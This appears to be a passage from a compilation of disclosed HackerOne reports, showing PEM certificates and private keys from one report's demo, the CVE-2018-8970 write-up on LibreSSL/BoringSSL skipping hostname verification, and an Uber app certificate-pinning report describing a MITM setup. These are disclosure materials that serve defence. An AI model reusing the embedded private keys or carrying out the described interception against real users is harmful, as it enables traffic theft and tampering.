MIIDezCCAmOgAwIBAgIJAPP+kRMqzgNDMA0GCSqGSIb3DQEBCwUAMFQxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQxDTALBgNVBAMMBG15Y2EwHhcNMTkxMTI2MTUxNjEwWhcN
MjAxMTI1MTUxNjEwWjBUMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0
ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMQ0wCwYDVQQDDARt
eWNhMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmK5z7YRTmxYEhm3/
lDrvJWiqsBS3fiq79YSfHlNIbVhgE6ObTTl2WOHJWU/Mw2dKr7l2/fL2R+7O98rt
MfI26aet5r73eu/4Kd/11mRUZ6CSAtzIaP+L7i4dRqR+XOfYTMEbi//Kuh2EvBha
cgB2jFaG1duu/bqTM1In7vKzJEUREd/EoYYBjt4UC5r6mIZ+CqYarfSmOGJ8BXGA
bewesTjqBoJ5DjsZzHkY7BdJzrD9OvCs9XChxeYfaojSGvs5gUJHEhFM6/G1xipv
Qr1VK0aADths9hQnV/8pj1dZLJqvEqEjqct16/CdVjI7B+xBTmhAvL43rxTar/EH
thmt7wIDAQABo1AwTjAdBgNVHQ4EFgQUSe33PfECxbQKWq5XfHj14xNcUsAwHwYD
VR0jBBgwFoAUSe33PfECxbQKWq5XfHj14xNcUsAwDAYDVR0TBAUwAwEB/zANBgkq
hkiG9w0BAQsFAAOCAQEAEDQAzjx4r+2Z1YaCIbToyD+BMuv250Tiwd4MrvKOx7LT
opnWwqn50KtLOfPCd+peNfsxOy9OCC+PqVnOKTnTIOOtv49pRsG3f1SmFjzHfPOC
tL0n7M4WGHDW0ITbuZWhmOMpeiQQLF45p2lcXT49vllRpta86501f+jUW/47nQfU
pGjk4Qbw18jXrAe1qsedisKL9VWdaj1Quxd0XVV2w7kGw6cHBlTNyJd+UeyczheQ
xM7svOeuCMLRMFusxq8Lo6CAwbNiSa/GW7AErHjtruinl9pJXn3FVUvYz9tJ4OrB
ErCfVLYzVDrohIGYS4PMmypx1Bxhlg5JIyoR3JRUuQ==
-----END CERTIFICATE-----
```

ca.key:

```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCYrnPthFObFgSG
bf+UOu8laKqwFLd+Krv1hJ8eU0htWGATo5tNOXZY4clZT8zDZ0qvuXb98vZH7s73
yu0x8jbpp63mvvd67/gp3/XWZFRnoJIC3Mho/4vuLh1GpH5c59hMwRuL/8q6HYS8
GFpyAHaMVobV2679upMzUifu8rMkRRER38ShhgGO3hQLmvqYhn4Kphqt9KY4YnwF
cYBt7B6xOOoGgnkOOxnMeRjsF0nOsP068Kz1cKHF5h9qiNIa+zmBQkcSEUzr8bXG
Km9CvVUrRoAO2Gz2FCdX/ymPV1ksmq8SoSOpy3Xr8J1WMjsH7EFOaEC8vjevFNqv
8Qe2Ga3vAgMBAAECggEAScIdJuUCLq2YSgjhqw49cWj67E1Vx5GFc7o51ECPgKNs
5o/m+ouD7LRGvOqcFNnVbsa+AThaWa24NmTF6ZcFiCMFE6+1hqJe1HvpG0UksVsU
rmVSO8cYJlwIsJPOp7so9wti72MG4JpaATQSnXgzzOAQC0gxZUm4ytYpjHmaqS4l
WdvCVzZJLOry5r6rjH4c72kp7hGo6+jXo9YgbSa1etDND4JCidrwks7e3SIiTw4m
Z5GbjfPU/Rtttzde72cU7WlGysVDzAJrmf4p/p8a3/aXouYoRHI/cgRadWzIfR/c
W1zFZWnZ24bbkjMjyFvq46lnW19JW+Zpjle/4dfkAQKBgQDKkhN5sSvZEXgDzOrz
vKyeqpuQ1XuZ8LwKyr39ixdf6/QsWYvCe7lIqTy+KLakWCd9SNDnzKYLbGnsF5Bs
sYk/yofM+VYGGQYvmLWKaigh3M+zoRfasLcfHxUSD2+CjLz+lslN3izNV5HO+jQQ
tRbjTgcokcHLGQGufYrOITOMbwKBgQDA88X77oDnGPA0ZDGLaOuur4ZfF+81HgJ2
sJykZmExQTkps3AdXAdHkOKepwlSr560ll104s398Ezb4LlGukm8vfShEgDskyca
sj7QwRepoIpWXMHfMgiuRcGoi+lHQxG35ZC81zy6Uzl02x0ib46a+QCnUIxIZneF
8cQiBce2gQKBgGyqN7BMDk1/RXYkctUVHTRwKMtk+cz2iqjvYUOlXYCjPnScBJDr
ddU4k9EeXfuDHovih84QxfHS0m9HpL3p7so9huO5zR+wRNU7ggciMy0XGoQtonI5
4cHcFp19kj/h53BaytnumPH+S8VQCqX7vq9oqAZnSiH85B4KUm+I9/IZAoGAEIdR
WGlv5Vv/h51lmRmdxtMGYbL9LMGrWFt8r6CNhtidevMCEaHGhdzlbM3GQK0GnVWc
H90l5DDnhJZViLeAhYiIIhwWtC1O1jyaoOtJiaBU+Vzsxp/UmokjM7r4esBGDki+
A080xolGjLoQXtjLkH7wDWUa/0C30GOLd5ajKwECgYEAlJAuaQ9LNF2Hx7BZZaPI
qKX0pNrZmEvt9WNItmw7q6KDinJ7yRm2daM4LVvKPKu7g/YfZ1nA8vTVueBnCMUB
QPIxbBdcgthgeRc2a0kmYZ6uQ4FI0cWJ3X/sA7PWxYbi01vWvp0drvptW3XfKtVh
1edcWLe7QmNpWS61IKxT+Jg=
-----END PRIVATE KEY-----
```

client.crt:

```
-----BEGIN CERTIFICATE-----
MIID0DCCArigAwIBAgIBATANBgkqhkiG9w0BAQUFADBUMQswCQYDVQQGEwJBVTET
MBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQ
dHkgTHRkMQ0wCwYDVQQDDARteWNhMB4XDTE5MTEyNjE1MjczM1oXDTIwMTEyNjE1
MjczM1owUzELMAkGA1UEBhMCVVMxETAPBgNVBAgTCFZpcmdpbmlhMRMwEQYDVQQH
EwpCbGFja3NidXJnMQ0wCwYDVQQKEwRUZXN0MQ0wCwYDVQQLEwRUZXN0MIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnVBta6GIai7hY96+mhJxgLEWT6Ds
2GF37ekF+aDgfAOavk/pVIbeN0wN9hCjkfg4AvFCYHoqXOhCt49s6t1TCakbntZm
uZyKpIMTG7O8kNvBwq3LMU7TIUsicKAHoBu+ALjqYT4gcWOWGC6LkPMwceE8UQV0
+U8YLZdiG1OshtYgPvLwj6LSYwQtu2nN5bklJzXF5HALfb7vDY5BKFCJa6eHafZi
2bhX4mjMvbeGPoHuKye0Zx/lBjcgAmElb7uhwkWRcTOkfwm6nfA0go6qxwGT+eFg
I5J4lB5t0t8ipCq5HV9Shh/GNMTItUraTU9pE3d8mNmSEkci4s41rvKOHQIDAQAB
o4GtMIGqMAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgL0MDsGA1UdJQQ0MDIGCCsG
AQUFBwMBBggrBgEFBQcDAgYIKwYBBQUHAwMGCCsGAQUFBwMEBggrBgEFBQcDCDAR
BglghkgBhvhCAQEEBAMCAPcwHgYDVR0RBBcwFYcEfwAAAZMNbWUtdGhlLWNsaWVu
dDAdBgNVHQ4EFgQUjc1t9QXJgsZFh2qL22onwUgpLbYwDQYJKoZIhvcNAQEFBQAD
ggEBAIEOiqFnxruDmue3jMn4IfP5rYnKEr5ag/XF8iIYum7jRYnr8VvmHzQUMtek
t++vai8hdvSxG4vsOKcdzXmThL8U/ZxEmId8UvEqKGJNfC1cu1evj8rV1D+9YS63
9XTgJXsI1OOCSL3I02KwAkRbjAR7SLLIWwtxwAOzWGyLbpbsQ+TTKTcztddBHFA1
F5vbZWTYk13BHJE/d74ZEs5dUBQM7zdhwlYLTaTd1r5lTWl4wwBjhXD0zMsKUUtB
pP7ZIsJZzSGZ3QQpLXTWRIKXUjANl95rqpI/FN6VkRMf2XuHEvKDMySDlN1Rh1bz
aZf59tRX9W/gqwiKqICO4UE5Z+I=
-----END CERTIFICATE-----
```

client.key:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAnVBta6GIai7hY96+mhJxgLEWT6Ds2GF37ekF+aDgfAOavk/p
VIbeN0wN9hCjkfg4AvFCYHoqXOhCt49s6t1TCakbntZmuZyKpIMTG7O8kNvBwq3L
MU7TIUsicKAHoBu+ALjqYT4gcWOWGC6LkPMwceE8UQV0+U8YLZdiG1OshtYgPvLw
j6LSYwQtu2nN5bklJzXF5HALfb7vDY5BKFCJa6eHafZi2bhX4mjMvbeGPoHuKye0
Zx/lBjcgAmElb7uhwkWRcTOkfwm6nfA0go6qxwGT+eFgI5J4lB5t0t8ipCq5HV9S
hh/GNMTItUraTU9pE3d8mNmSEkci4s41rvKOHQIDAQABAoIBAAtjLwiDgORu0FHy
ZcmxXBX8u6i39W0UYSIPpCcVxioz+JeeIT3FJYDLOJd/TNfcJ/HOlQd20Go5RdsT
vsahjsk8PIua6YS2GDMgadmvgQ7bWYNGIVdIZXAbiDqu2t50I6TZvd2cKa0LkGnf
tKqhb/hOXZdf1b/WQeHK+4cO34ZDDLGE884AAOjHrFcU9t6lEgvtg0fHX9VdBwZu
zKXo/Iik3vPcHpmQtVnIQ+aB8Zr/Z+NvIxP6NmLQPmkm3deJrw/sIXitD06fRtZu
juWoPzELxMDG9wZ1yMiWbrWua1w462T0+mNlAok6cY8ju0NSpMDnP29NiRzQgNUo
w4wNpAECgYEAzrymeZfrJgrpKHjcgnohEEdpj/JWzFxj7DY0gjrkZsiFwVVRdcZU
saKbzwOh4fsyb17PXn/Set8gsxigcKRu8n8j0llOfVlK8H3zspa9xU2NvBVtYpzD
89BRCocLKmr9V2E+KQ8b0shfcOtWX1rUCKrDHDGxCzJt20hMzSnNIr0CgYEAwszl
ABcGu9fbtzBZmcumuN4YO7Q4yCgAHdoO5RhJ5hxdXt04b5M18oa6jYzfPa7AA5wM
AR8jaXMkLIOWBZvWeTZwrEVNoEHh5QOibPjQM/mCNVOhwvQzJXJAsMfhuljkcdKO
2ZRnWrIQJaA52tYaPT/omCu/Kzn8zmvLn4SmfuECgYBfKKqgEXNlgWQtAuTNEhYh
/hzy6yNU0boUwiaNQzparTYT9YeXZIEberOpKAzdjdh7NvLQlpl1gTr19QH0l1uS
Nz9v1TexruY1qGQB8izLopT43AwLdgkkMuD6rYpQLgsKq3IHSDMQZLa5rTmGjrJG
gwNn+N97Pe0fIDppvTH1KQKBgAYH6+sVy2qTY0UHpS6CxJWioqNuj/d6bY5/CskC
+H68UBO4y5+AskHg8/Of8eVp/J3f/esm+KSyIOOT61gfHAPCsLhUqPOWNpUtiKDR
Dzkct3BJN4/emZrGL8SJW662Q9RWTX/k/VIsgx13GXNx/3v3946GhDOlZvNJGRPG
OpVhAoGAX2C8di2SWA1Li0A+lqc3zwu/RZX7fe7s6nmqbwb6Fh5mooRaLZIXJSJk
0/onZP769vk5WZgvvWKf6d11e4/uqYcQBOgvLAkucf6KF26vmkVenb1rjl6WDN9N
8S/HZ+9vPo/EQkK0raNL8VkmTRvTf/JhB9yByrEisAf0ivgYJto=
-----END RSA PRIVATE KEY-----
```

server.crt

```
-----BEGIN CERTIFICATE-----
MIIDlzCCAn+gAwIBAgIJAK4r13axUKSaMA0GCSqGSIb3DQEBCwUAMGIxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQxGzAZBgNVBAMMEnBjNTcubmV0d29yay5sb2NhbDAeFw0x
OTExMjYxNTA2MzRaFw0yMDExMjUxNTA2MzRaMGIxCzAJBgNVBAYTAkFVMRMwEQYD
VQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBM
dGQxGzAZBgNVBAMMEnBjNTcubmV0d29yay5sb2NhbDCCASIwDQYJKoZIhvcNAQEB
BQADggEPADCCAQoCggEBAM3sBD3meSnfghzSli0PD3UD8IKKytA7PQnMC9BiKqvW
hNZPfdTLiZAgsA3wwsmpMkHKCpB8/lQ53dR0QYfjncOafVdmFMWkNR/BsUSiHy+4
kDQzLK/DojEOlHaMARF3LGCKD7S4hBhJIC9rLgeZyKisgm2pAGmAEGNIGWTE5AUu
t0TBlef/+CqODM1Mxf2lKWlRE6FqEA27nCi4U/ct9g0zOzrjh4vGrwcXV8BDtLvB
APOCdeCTEo/iX65cdH2LC9ZQ6XQMl2OfIyTjvHanBFf8Jq6VbbMuqPTBytCtd5Lv
rT7k8QZasfyzvXTNSfwjvUoMogTFH7rtAxBWVaDaD+0CAwEAAaNQME4wHQYDVR0O
BBYEFGOFBfdtlcbkFjMboi5U8RDmttJyMB8GA1UdIwQYMBaAFGOFBfdtlcbkFjMb
oi5U8RDmttJyMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAFB3uST4
NX6NS3V99a1JvwalHYOPkStR4DHG601hWuBjqM4jmU5H851/ATbcusFvXnmQ2hGC
ksHJh9V5wd1Rdjybj6UlgZ6GWTdK6qTJnwUBu0v2aNTM9No4OdP6G15Wr9B1hmw4
UoqmSbpoCd4KRhVNAL1iwotPclbbJUBFPrJLJ3w7+sq9yB/eskYadtHsqS+YNJ/G
WNxtkIuDQbRU4hOJAjWDZDbDTDC9a7UnpNgniUgOXlJwANb5CHe+MIZkVn2phGnN
p5w6+SxQn1ORRDGeg5anGzpvKLppvuRWjON+UFTuErijEIp431WxloezcyLcwZHU
3JE73HqyfQAFj+o=
-----END CERTIFICATE-----
```

server.key:

```
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDN7AQ95nkp34Ic
0pYtDw91A/CCisrQOz0JzAvQYiqr1oTWT33Uy4mQILAN8MLJqTJBygqQfP5UOd3U
dEGH453Dmn1XZhTFpDUfwbFEoh8vuJA0Myyvw6IxDpR2jAERdyxgig+0uIQYSSAv
ay4HmciorIJtqQBpgBBjSBlkxOQFLrdEwZXn//gqjgzNTMX9pSlpUROhahANu5wo
uFP3LfYNMzs644eLxq8HF1fAQ7S7wQDzgnXgkxKP4l+uXHR9iwvWUOl0DJdjnyMk
47x2pwRX/CaulW2zLqj0wcrQrXeS760+5PEGWrH8s710zUn8I71KDKIExR+67QMQ
VlWg2g/tAgMBAAECggEAV8Or2yYLpgkYz2gBkZrFn73aGAlHf5B/51kL//iW7z4y
x5SBsNw++Sq1XnuqyYBPZzLRZdugGg2/ufkCpQQiDWge280qNUJTUgGfp/zhBdnH
vDfDZ/YdfoMUS6JIIkWEqHCvWPr7cc5Y5Vzs9VhZ6Wn8/Pf2sQBf+7CTAhvYg0wt
PKY3ZnVEyATmDtncD2Jhbv/CI4yfMEWaG5ONjWW+dFNCjfivaMpiRo7vU/B/EQ76
npXtljMf53mSdRiubShJVQf8ipZW/rJTDZr1ZawFomY1gawhLp90hIFr6D8C4zX0
r7F0zwC6A5XjOzRPVeAz0FXVCOO+4Plceryd297pkQKBgQD8mgg7OJFwMun9XFDO
j3GTPuKl/ao0fwYyDdsN/r33GpHtdZGMcUa8VYlAKvL25BQjSIWftkzoIHZqe/NU
DALbUUh4jknC8HNvaJQGwO6kmJKxnU4v3kg9EHSiIjbiBknoKNQ+bK34P43nzPLB
tIT6xyeRME/uxj7vvqW6jQ1qBwKBgQDQsTfLtAt7RWHegH4MPgHeFLeqWxAn1vWM
aIhbez+a/g1s/oR8gFzfXWh/c+H2d/kDOwWGBjGUeFpz+yJzIfQ0gOo350+g0oyU
ZDwIQ2/BiR6GMGNVfTPRzukb1cXs5BMzySHG3ouvZdLPOucoLDPORj5I5T254EIG
FXJZ0TeJawKBgH2/bFOW4If7QJK5Dx0VOZP0nT3G3qFNjtcCIMeBxi2qE3UjrvY8
OdtttWq1NsiDWCcMZkDQrs5rwqdV1xdC93UYrLwfEUczDjQq2m3WQ7a6oWQ8C/02
ab3EYFuKLsosGUSydp4w2hYYBVucokidxglVdTQI2fHizNfqj3Qj3canAoGAAVjT
el4cINyOyCfeKGgSDQPnN5NE5Gzvwss97hE6lN6E6aou4rrVXp+0t/XghH27vriX
zYims0Wfl9YMH+AdOmWGnXvBuNEDFUYcWRVOWFpxNv6C9Z9MQVNrj8FueJv0P8ZR
kH4JOsWWeb3wlgLLBs7PQhswrc1zv6RNy6SdDicCgYBc/zi70iBH27P0RdPL4ypx
3mjuRcAGEJvCB1AoEI0ib01M+XQJWbMv2wx0xQLDQpOdtuN2yAQi/QCkU8tp+Ztq
uRAZ5yops0ciaWLDMOQrdp4f8OCxd/mm2xGjWV7PNSE+52+UmOTGGNQNP4n8f1QJ
NCRD4APLro338oCS2zUQMQ==
-----END PRIVATE KEY-----
```

## Impact

denial of service - remotely crashing a server

---

### [Silent omission of certificate hostname verification in LibreSSL and BoringSSL](https://hackerone.com/reports/329645)

- **Report ID:** `329645`
- **Severity:** Critical
- **Weakness:** Improper Certificate Validation
- **Program:** Internet Bug Bounty
- **Reporter:** @tiran
- **Bounty:** - usd
- **Disclosed:** 2019-09-26T20:38:28.174Z
- **CVE(s):** CVE-2018-8970

**Vulnerability Information:**

## Abstract

LibreSSL and BoringSSL implemented ``X509_VERIFY_PARAM_set1_host`` differently than OpenSSL. All applications that use the preferred and documented way to configure a TLS connection for hostname validation, silently neglect to perform hostname validation at all. As a consequence, they are vulnerable to MitM attacks.

## Description

OpenSSL 1.0.2 introduced the function [X509_VERIFY_PARAM_set1_host](https://www.openssl.org/docs/man1.0.2/crypto/X509_VERIFY_PARAM_set1_host.html). It sets the expected DNS hostname for a TLS connection. During the handshake, OpenSSL verifies, that the hostname matches one of the DNS names in the subject alternative name extension of the server's X.509 certificate. It's a critical step to authenticate the identity of a TLS server. A client **must** properly validate the server's DNS name.

The ``X509_VERIFY_PARAM_set1_host`` function takes three parameters. The second parameter is the expected host name, the third parameter is the length of the host name. OpenSSL allows the caller to pass in ``0`` as namelen. It indicates that the server name is a NULL terminated C string. It's documented in the man page for the function and used as example on OpenSSL's [wiki page](https://wiki.openssl.org/index.php/Hostname_validation) about hostname validation. The wiki page is the top hit for a Google search for "openssl hostname validation".

LibreSSL and BoringSSL implement the same function. LibreSSL release 2.7.0 added ``X509_VERIFY_PARAM_set1_host`` just a few days ago. However both libraries behave differently in very subtle but critical way. Their implementation of ``X509_VERIFY_PARAM_set1_host(param, "hostname", 0)`` does **not** configure the TLS/SSL connection to validate the hostname. Instead the call only clears any previously configured hostname and returns success. As a consequence, LibreSSL and BoringSSL do **not** perform any hostname validation and except just any arbitrary certificate for any hostname as long as the certificate is generally trusted. Since the function call returns success, the application never sees an error, too.

The man page for LibreSSL 2.7.0 even documented to support the calling convention. The release took the divergent implementation from BoringSSL but the documentation from OpenSSL.

## Demo

The attached files and https://github.com/tiran/CVE-2018-8970 are a demo for the bug. WIth OpenSSL the command fails as expected with a hostname mismatch error:

```
$ make
...
Error connecting to server
140678245971584:error:1416F086:SSL routines:tls_process_server_certificate:certificate verify failed:ssl/statem/statem_clnt.c:1230:
X509 verify error: Hostname mismatch
```

With LibreSSL 2.7.0 the command does not fail

```
$ make SSL_BASEDIR=/path/to/libressl/2.7.0
...
./cve2018_8970_demo
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/plain
X-Frame-Options: SAMEORIGIN
x-xss-protection: 1; mode=block
X-Clacks-Overhead: GNU Terry Pratchett
Via: 1.1 varnish
Content-Length: 539
Accept-Ranges: bytes
Date: Sun, 25 Mar 2018 12:30:49 GMT
...
CVE2018-8970: Expected a hostname mismatch error
```

## Resources

* LibreSSL CVE https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8970
* LibreSSL 2.7.1 fix https://github.com/libressl-portable/openbsd/commit/0654414afcce51a16d35d05060190a3ec4618d42
* BoringSSL ticket https://bugs.chromium.org/p/chromium/issues/detail?id=824799
* BoringSSL fix https://boringssl.googlesource.com/boringssl/+/e759a9cd84198613199259dbed401f4951747cff

## Impact

The silent omission of hostname verification completely breaks confidence of TLS/SSL protocol.  It consequently allows man-in-the-middle attackers to spoof servers and obtain sensitive information via any  certificate. An attacker can use any trusted certificate from any CA and pretend to be any website. For example a malicious Wifi provider could use a Lets Encrypt cert to spoof a user to be Apple, Google, or Facebook.

## CPython
CPython's [ssl module](https://github.com/python/cpython/blob/4ca0739c9d97ac7cd45499e0d31be68dc659d0e1/Modules/_ssl.c#L855) was directly affected by the bug. Since Python 3.7 the module uses ``X509_VERIFY_PARAM_set1_host(param, server_hostname, 0)`` to match the server's hostname against the certificate.

## Mongo DB
Mongo DB's [C driver](https://github.com/mongodb/mongo-c-driver/blob/9163c64753f9f2d358a7203ce95741f87061f6b4/src/mongoc/mongoc-stream-tls-openssl.c#L687) also uses ``X509_VERIFY_PARAM_set1_host`` with namelen=0. The code segment is currently disabled for LibreSSL because it hasn't been ported to LibreSSL 2.7 yet. With high probability they would have been vulnerable, too.

## More
I suspect that more application are vulnerable to the bug. OpenSSL's wiki page https://wiki.openssl.org/index.php/Hostname_validation recommends ``X509_VERIFY_PARAM_set1_host(param, servername, 0);`` as preferred way to enable hostname verification. The namelen=0 is also explicitly mentioned in the documentation and man page for [X509_VERIFY_PARAM_set1_host](https://www.openssl.org/docs/man1.0.2/crypto/X509_VERIFY_PARAM_set1_host.html) since OpenSSL 1.0.2 and LibreSSL 2.7.0.

---

### [The Microsoft Store Uber App Does Not Implement Certificate Pinning](https://hackerone.com/reports/293358)

- **Report ID:** `293358`
- **Severity:** Critical
- **Weakness:** Improper Certificate Validation
- **Program:** Uber
- **Reporter:** @gregoryvperry
- **Bounty:** - usd
- **Disclosed:** 2017-12-24T20:16:01.570Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The Microsoft Store Uber App (Windows Phone Architecture) does not properly implement certificate pinning.

## Security Impact
Layer-2+ network traffic transmitted from and received by the app can be surreptitiously intercepted and transparently modified by an attacker, with no warnings or errors presented to the app user.

## Reproduction Steps
A transparent Layer-2 MITM proxy was configured between a device running the most recent release of the Uber app for Windows Phone Architecture and an Internet gateway. Self-signed certificates were asserted on behalf of the remote systems that the app communicated with. All traffic transmitted and received by the Uber app was able to be captured and then modified transparently, without any notifications or certificate warnings sent to the app user.

## Specifics
* Account GregPerry804@gmail.com was used for testing
* It appears that the apps for iOS and Android properly implement certificate pinning, with only the Windows Phone Architecture Uber App affected by this vulnerability.

## Impact

In this scenario an attacker has the ability to modify a rider's profile, to access previous trip histories, to schedule and/or cancel Uber driver dispatches, and the ability to access and/or modify stored payment information.

Driver functionality was not tested. If the Uber Driver role is also implemented within the Microsoft Phone Architecture Uber App, then all functionality encapsulated within the app as relates to driver functionality could be surreptitiously observed and/or transparently modified as well.

This particular vulnerability can be implemented as an ARP cache poisoning attack, making it especially relevant to Uber riders who utilize wireless access points at public hotspots to dispatch Uber rides.

---
